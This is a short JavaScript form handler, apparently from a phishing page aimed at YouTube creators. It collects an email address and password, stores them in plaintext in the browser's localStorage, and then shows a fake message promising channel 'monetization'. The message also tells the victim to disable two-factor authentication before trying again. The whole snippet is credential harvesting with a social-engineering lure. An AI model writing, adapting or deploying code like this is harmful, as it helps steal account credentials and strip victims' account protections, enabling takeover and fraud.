<script>
    
document.getElementById('userForm').addEventListener('submit', function(event) {
  event.preventDefault();

  let passWord = document.getElementById('passWord').value;
  let email = document.getElementById('email').value;
  
  let emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  
  if (!passWord || !email) {
    alert('Please fill out all fields');
  } else if (!emailRegex.test(email)) {
    alert('Please provide a valid email address and password');
  } else {
    let formData = {
      passWord: passWord,
      email: email
    };

    let storedForms = JSON.parse(localStorage.getItem('storedForms')) || [];
    storedForms.push(formData);
    localStorage.setItem('storedForms', JSON.stringify(storedForms));
    alert('please try again after 15 minutes for complete monetization on your YouTube channel, Note:Disable 2FA on your account before trying again.');
  }
});

</script>
